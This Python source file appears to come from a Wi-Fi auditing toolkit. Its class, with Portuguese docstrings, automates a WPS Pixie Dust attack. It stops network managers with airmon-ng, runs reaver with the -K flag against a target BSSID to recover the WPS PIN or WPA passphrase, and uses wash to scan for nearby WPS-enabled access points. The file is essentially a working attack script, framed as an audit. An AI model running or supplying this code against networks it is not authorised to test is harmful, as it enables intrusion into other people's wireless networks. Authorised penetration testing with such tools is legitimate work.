import subprocess
from spectra802.utils.logger import setup_logger

logger = setup_logger("wps")

class WPSAttacker:
    """
    Módulo de auditoria para redes com suporte a WPS (Wi-Fi Protected Setup).
    Invocador automatizado das suítes `reaver` e `wash`/`aircrack-ng` para execução 
    da técnica Pixie Dust (exploração off-line de sementes PRNG no intercâmbio EAP-WPS).
    """

    def __init__(self, interface: str = "wlan0"):
        self.interface = interface

    def run_pixie_dust(self, target_bssid: str, channel: int = None, timeout: int = 120) -> dict:
        """
        Executa o ataque Pixie Dust via Reaver (-K).
        Aplica tratamento de concorrência com airmon-ng check kill e isolamento
        de flags de caractere único suportadas nativamente pelo Reaver v1.6.6 no Kali Linux.
        """
        logger.info(f"Iniciando auditoria WPS Pixie Dust no BSSID: {target_bssid} (Interface: {self.interface})...")
        
        # Isola concorrência de gerenciadores de rede (NetworkManager/wpa_supplicant)
        try:
            subprocess.run(["sudo", "airmon-ng", "check", "kill"], capture_output=True, check=False)
        except Exception as e:
            logger.warning(f"Não foi possível executar airmon-ng check kill: {e}")

        # Monta comando com flags de parâmetro único
        cmd = [
            "sudo", "reaver",
            "-i", self.interface,
            "-b", target_bssid,
            "-K",
            "-vv",
            "-N",
            "-S",
            "-d", "1"
        ]

        if channel:
            cmd.extend(["-c", str(channel)])

        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=timeout
            )

            output = result.stdout + "\n" + result.stderr

            if "WPS PIN:" in output or "WPA PSK:" in output:
                logger.info(f"[+] Sucesso! PIN WPS/Senha obtidos para o BSSID {target_bssid}.")
                return {
                    "bssid": target_bssid,
                    "vulnerable": True,
                    "output": output,
                    "error": None
                }
            else:
                logger.warning(f"[-] O BSSID {target_bssid} não retornou a chave via Pixie Dust.")
                return {
                    "bssid": target_bssid,
                    "vulnerable": False,
                    "output": output,
                    "error": "Pixie Dust não obteve PIN/PSK."
                }

        except subprocess.TimeoutExpired:
            logger.warning(f"[-] Tempo limite ({timeout}s) excedido no ataque WPS para o BSSID {target_bssid}.")
            return {
                "bssid": target_bssid,
                "vulnerable": False,
                "output": "",
                "error": "Timeout"
            }
        except Exception as e:
            logger.error(f"[-] Erro ao executar o utilitário Reaver: {e}")
            return {
                "bssid": target_bssid,
                "vulnerable": False,
                "output": "",
                "error": str(e)
            }

    def scan_wps_targets(self, timeout: int = 15) -> list:
        """
        Ferramenta complementar: Utiliza o utilitário `wash` (da suíte Reaver/Aircrack) 
        para mapear especificamente Access Points com WPS ativado e estado de travamento (WPS Locked).
        """
        logger.info(f"Executando varredura direcionada WPS (wash) por {timeout}s na interface {self.interface}...")
        cmd = ["sudo", "wash", "-i", self.interface]
        
        try:
            res = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
            output = res.stdout
            wps_list = []

            for line in output.splitlines():
                parts = line.split()
                if len(parts) >= 5 and ":" in parts[0] and len(parts[0]) == 17:
                    wps_list.append({
                        "bssid": parts[0],
                        "channel": parts[1],
                        "rssi": parts[2],
                        "wps_version": parts[3],
                        "locked": parts[4]
                    })

            logger.info(f"[+] Encontrados {len(wps_list)} alvos com suporte WPS via wash.")
            return wps_list

        except subprocess.TimeoutExpired:
            logger.info("Varredura wash concluída (timeout atingido).")
            return []
        except FileNotFoundError:
            logger.warning("Utilitário wash não localizado no PATH.")
            return []
        except Exception as e:
            logger.error(f"Erro ao executar wash: {e}")
            return []
